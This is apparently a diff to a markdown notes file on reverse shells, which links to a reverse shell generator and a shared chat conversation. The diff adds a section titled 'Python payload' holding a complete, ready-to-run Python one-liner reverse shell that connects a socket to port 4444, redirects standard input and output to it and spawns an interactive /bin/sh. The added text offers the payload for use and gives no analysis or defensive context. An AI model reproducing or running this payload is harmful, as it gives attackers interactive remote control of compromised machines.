@@ -16,3 +16,8 @@ https://devvj-1.github.io/Reverse-Shell-Generator/
 ```
 https://chatgpt.com/share/74ea2fe2-6b6d-400e-bfee-1a434763a162
 ```
+
+## Python payload 
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
